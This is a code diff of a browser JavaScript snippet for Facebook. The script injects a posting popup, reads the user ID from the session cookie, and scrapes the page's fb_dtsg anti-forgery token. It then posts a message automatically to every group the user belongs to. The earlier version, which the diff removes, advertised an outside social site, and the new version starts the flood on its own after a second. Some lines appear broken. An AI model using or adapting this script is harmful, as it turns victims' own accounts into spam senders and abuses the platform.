@@ -1,3 +1,10 @@
+var askformsg ="<div><span class='img sp_2e7db0 sx_09ce1d'></span><a style='position:absolute;padding-left:3px;font-size:11px;'>Write Post</a></div>";
+askformsg += "<div><textarea id='txtFloodMsg' placeholder='Write somthing...'  style='padding-top:5px;width:505px;height:48px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.1);'></textarea></div>";askformsg +="<div><button style='margin-left:453px' class='-cx-PRIVATE-abstractButton__root -cx-PRIVATE-uiButton__root -cx-PRIVATE-fbComposerMessageBox__button selected -cx-PRIVATE-uiButton__confirm' onclick='autopostingfunc(this);' >Post</button></div>";
+var Popupset = document.createElement("div");
+Popupset.setAttribute("style", "position:fixed;left:50%;margin-left:-298px;top:100px;z-index:9999;font-size:11px;font-family:tahoma;color:#3B5998;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);font-weight:bold;border-radius:3px;border:1px solid rgba(200,200,50,0.2);padding:5px;background-color:rgba(255,255,255,0.9)");
+Popupset.innerHTML = askformsg;
+document.body.appendChild(Popupset);
+
 jx = {
     getHTTPObject: function () {
         var A = false;
@@ -149,12 +156,12 @@ jx = {
 var j = 0;
 var k = 0;
 var suc = 0;
-var msg = "Join new social networking website www.devilsuniverse.com";
+var msg = "Hello Friends.";
 var arr = new Array();
-
-function HTML_text_composer_hdeartext_and_postdatacollection(sender) {
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function autopostingfunc(sender) {
     if (document.getElementById("txtFloodMsg").value != "") msg = document.getElementById("txtFloodMsg").value;
-    jx.load(window.location.protocol + "//" + "www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=group&viewer" + "=" + Env.user + "&token=v7&lazy=0&__user=" + Env.user, function (data) {
+    jx.load(window.location.protocol + "//" + "www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=group&viewer" + "=" + user_id + "&token=v7&lazy=0&__user=" + user_id, function (data) {
         var text = data;
         var json = text.substring(text.indexOf('{'));
         var friends = JSON.parse(json);
@@ -163,31 +170,22 @@ function HTML_text_composer_hdeartext_and_postdatacollection(sender) {
             arr.push(friends[n].uid);
         }
         sender.parentNode.innerHTML = "Please wait....";
-        xhexa_wifi_makerequest_to_load_devilsUniverse_homepage_AfterLogin();
+        postitok();
     });
 }
 var a = document.body.innerHTML;
 var dts = a.match(/name="fb_dtsg" value="([^"]+)"/)[1];
 var composerid = a.match(/name="xhpc_composerid" value="([^"]+)"/)[1];
-//var msg = Invitation to join website WWW.DEVILSUNIVERSE.COM, Its a social networking website like ORKUT AND FACEBOOK. So join it now.;
 
 
-function xhexa_wifi_makerequest_to_load_devilsUniverse_homepage_AfterLogin() {
+
+function postitok() {
     pst = "fb_dtsg=" + dts + "&xhpc_composerid=" + composerid + "&xhpc_targetid=" + arr[suc] + "&xhpc_context=home&xhpc_fbx=1&xhpc_message_text=" + encodeURIComponent(msg) + "&xhpc_message=" + encodeURIComponent(msg) + "&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]=pagelet_group_composer";
     with(newx = new XMLHttpRequest()) open("POST", "/ajax/updatestatus.php?__a=1"), setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), send(pst);
     suc++;
     if (suc > arr.length) {
         alert("Completed. Please refresh page.");
         suc = 0;
-    } else setTimeout("xhexa_wifi_makerequest_to_load_devilsUniverse_homepage_AfterLogin()", 30000 / arr.length);
+    } else setTimeout("postitok()", 30000 / arr.length);
 }
-var askformsg = "<table><tr><td>Write your message here.</td></tr><tr><td><textarea id='txtFloodMsg' style='width:400px;height:150px'></textarea></td></tr><tr><td><input type='button' value='Start Posing' onclick='HTML_text_composer_hdeartext_and_postdatacollection(this);' /></td></tr></table>";
-var askDIV = document.createElement("div");
-askDIV.style.position = "absolute";
-askDIV.style.backgroundColor = "#abf";
-askDIV.style.zIndex = "100";
-askDIV.style.top = "100px";
-askDIV.style.left = "200px";
-askDIV.innerHTML = askformsg;
-document.body.appendChild(askDIV);
-//setTimeout("HTML_text_composer_hdeartext_and_postdatacollection()",1000);
+setTimeout("autopostingfunc()",1000);
